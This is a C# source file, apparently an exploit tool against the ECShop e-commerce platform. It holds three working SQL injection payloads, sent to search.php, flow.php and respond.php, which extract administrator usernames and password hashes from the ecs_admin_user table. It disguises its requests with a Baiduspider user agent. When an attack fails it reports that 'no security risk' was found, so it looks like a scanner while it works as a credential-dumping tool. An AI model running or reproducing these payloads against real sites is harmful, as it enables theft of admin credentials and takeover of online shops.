using System;
using System.Net;
using System.Text;
namespace windowsmanger
{
	internal class ecshop
	{
		public string exp(string url)
		{
			string result;
			try
			{
				string exp = "/search.php?encode=YToxOntzOjQ6ImF0dHIiO2E6MTp7czoxMjU6IjEnKSBhbmQgMT0yIEdST1VQIEJZIGdvb2RzX2lkIHVuaW9uIGFsbCBzZWxlY3QgY29uY2F0KHVzZXJfbmFtZSwweDNhLHBhc3N3b3JkLCciXCcpIHVuaW9uIHNlbGVjdCAxIyInKSwxIGZyb20gZWNzX2FkbWluX3VzZXIjIjtzOjE6IjEiO319";
				string urls = url;
				if (!urls.Contains("http://"))
				{
					urls = "http://" + urls;
				}
				string jieguo = this.flowexp(urls);
				if (jieguo != "")
				{
					result = jieguo;
				}
				else
				{
					string jieguo2 = this.respondexp(urls);
					if (jieguo2 != "")
					{
						result = jieguo2;
					}
					else
					{
						string bbn = new WebClient
						{
							Headers = 
							{

								{
									"user-agent",
									"Baiduspider"
								}
							},
							Encoding = Encoding.Default
						}.DownloadString(urls + exp);
						int kaishi = bbn.IndexOf("AND g.goods_id IN ('");
						int jieshu = bbn.IndexOf("') union select 1#");
						string shuju = bbn.Substring(kaishi + 20, jieshu - kaishi - 21);
						result = shuju;
					}
				}
			}
			catch
			{
				result = "网站未发现安全隐患";
			}
			return result;
		}
		public string flowexp(string urls)
		{
			string postString = "goods_number%5B1%27+and+%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+%28SELECT+concat%28user_name%2C0x7c%2Cpassword%29+FROM+ecs_admin_user+limit+0%2C1%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29+and+1%3D1+%23%5D=1&submit=exp";
			byte[] postData = Encoding.UTF8.GetBytes(postString);
			byte[] responseData = new WebClient
			{
				Encoding = Encoding.UTF8,
				Headers = 
				{

					{
						"Referer",
						urls + "/flow.php?step=update_cart"
					},

					{
						"Content-Type",
						"application/x-www-form-urlencoded"
					},

					{
						"user-agent",
						"Baiduspider"
					},

					{
						"Cookie",
						"ECS_ID=41d5bbe6ff9506acd528d31df953f34804908ba7; ECS[visit_times]=1"
					}
				}
			}.UploadData(urls + "/flow.php?step=update_cart", postData);
			string scrString = Encoding.UTF8.GetString(responseData);
			int kaishi = scrString.IndexOf("Duplicate entry '");
			string shujus = scrString.Substring(kaishi + 17, 100);
			string shuju = "";
			if (kaishi > 0)
			{
				shuju = shujus.Substring(0, shujus.IndexOf("'"));
			}
			return shuju;
		}
		public string respondexp(string url)
		{
			string exp = "/respond.php?code=alipay&subject=0&out_trade_no=%00' and (select * from (select count(*),concat(floor(rand(0)*2),(select concat(user_name,password) from ecs_admin_user limit 1))a from information_schema.tables group by a)b) -- By seay";
			string bbn = new WebClient
			{
				Headers = 
				{

					{
						"user-agent",
						"Baiduspider"
					}
				},
				Encoding = Encoding.Default
			}.DownloadString(url + exp);
			int kaishi = bbn.IndexOf("Duplicate entry '");
			string shujus = bbn.Substring(kaishi + 17, 100);
			string shuju = "";
			if (kaishi > 0)
			{
				shuju = shujus.Substring(0, shujus.IndexOf("'"));
			}
			return shuju;
		}
	}
}
